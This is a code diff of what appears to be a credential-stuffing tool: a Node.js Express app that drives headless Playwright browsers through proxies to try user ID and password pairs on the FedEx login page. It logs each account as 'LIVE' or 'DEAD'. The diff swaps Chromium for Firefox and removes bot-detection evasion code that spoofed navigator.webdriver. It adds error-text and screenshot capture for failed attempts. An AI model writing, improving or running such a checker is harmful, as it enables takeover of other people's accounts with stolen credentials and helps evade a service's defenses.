@@ -1,6 +1,6 @@
 require('dotenv').config();
 const express = require('express');
-const { chromium } = require('playwright');
+const { chromium, firefox } = require('playwright');
 const path = require('path');
 
 const app = express();
@@ -41,17 +41,12 @@ async function tryLogin(userId, password, proxy) {
   try {
     const launchOpts = {
       headless: true,
-      args: [
-        '--no-sandbox', '--disable-setuid-sandbox',
-        '--disable-dev-shm-usage', '--disable-gpu',
-        '--disable-blink-features=AutomationControlled',
-        '--disable-features=IsolateOrigins,site-per-process'
-      ]
+      args: ['--no-sandbox', '--disable-setuid-sandbox']
     };
 
-    browser = await chromium.launch(launchOpts);
+    browser = await firefox.launch(launchOpts);
     const contextOpts = {
-      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
       ignoreHTTPSErrors: true,
       viewport: { width: 1920, height: 1080 },
       locale: 'en-GB',
@@ -64,10 +59,6 @@ async function tryLogin(userId, password, proxy) {
       contextOpts.proxy = { server: `http://${host}:${port}` };
     }
     const context = await browser.newContext(contextOpts);
-    await context.addInitScript(() => {
-      Object.defineProperty(navigator, 'webdriver', { get: () => false });
-      window.chrome = { runtime: {} };
-    });
     const page = await context.newPage();
 
     log('INFO', `[${userId}] Navigating to FedEx login...`);
@@ -169,11 +160,23 @@ async function tryLogin(userId, password, proxy) {
     const finalTitle = await page.title();
     const isLoggedIn = !finalUrl.includes('/credentials') && !finalUrl.includes('secure-login');
 
+    let errorMsg = '';
+    let screenshot = '';
+    if (!isLoggedIn) {
+      try {
+        const errEl = await page.textContent('[class*="error"], [class*="alert"], .notification--error, #errorMessage').catch(() => '');
+        if (errEl) errorMsg = errEl.trim().substring(0, 300);
+      } catch {}
+      try {
+        screenshot = await page.screenshot({ encoding: 'base64' }).catch(() => '');
+      } catch {}
+    }
+
     await browser.close();
     const elapsed = Date.now() - startTime;
-    log(isLoggedIn ? 'LIVE' : 'DEAD', `[${userId}] ${isLoggedIn ? 'LIVE' : 'DEAD'} | URL: ${finalUrl} | ${elapsed}ms | proxy: ${proxy || 'direct'}`);
+    log(isLoggedIn ? 'LIVE' : 'DEAD', `[${userId}] ${isLoggedIn ? 'LIVE' : 'DEAD'} | URL: ${finalUrl} | ${elapsed}ms | proxy: ${proxy || 'direct'}${errorMsg ? ' | Error: ' + errorMsg : ''}`);
 
-    return { success: isLoggedIn, redirectedTo: finalUrl, proxy: proxy || 'direct', time: elapsed };
+    return { success: isLoggedIn, redirectedTo: finalUrl, proxy: proxy || 'direct', time: elapsed, error: errorMsg, screenshot };
   } catch (err) {
     if (browser) await browser.close().catch(() => {});
     const elapsed = Date.now() - startTime;
